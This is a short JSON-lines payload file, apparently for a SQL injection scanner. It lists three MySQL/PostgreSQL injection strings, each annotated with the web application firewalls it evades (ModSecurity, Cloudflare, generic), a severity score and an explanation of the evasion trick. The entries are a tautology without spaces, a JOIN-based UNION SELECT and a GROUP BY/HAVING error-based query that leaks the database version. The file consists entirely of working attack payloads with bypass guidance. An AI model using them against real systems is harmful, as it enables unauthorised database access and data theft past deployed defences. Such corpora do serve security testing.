{"text": "1'=(0)or'1", "technique": "waf_bypass", "databases": ["mysql"], "contexts": ["string"], "waf_bypasses": ["modsecurity", "cloudflare", "generic"], "severity_boost": 0.80, "explanation": "Compact no-space payload. MySQL evaluates '1'=(0) as false then OR '1' as truthy. No spaces or SQL keywords used except OR."}
{"text": "' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b) --", "technique": "waf_bypass", "databases": ["mysql", "postgresql"], "contexts": ["string"], "waf_bypasses": ["generic"], "severity_boost": 0.75, "explanation": "JOIN-based column generation instead of comma-separated NULLs. Some WAFs block UNION SELECT NULL,NULL but not JOIN-based subqueries."}
{"text": "' OR 1 GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)) HAVING MIN(0) #", "technique": "waf_bypass", "databases": ["mysql"], "contexts": ["string"], "waf_bypasses": ["generic"], "severity_boost": 0.76, "explanation": "Error-based extraction using GROUP BY/HAVING instead of extractvalue/updatexml. Less commonly signatured by WAFs."}
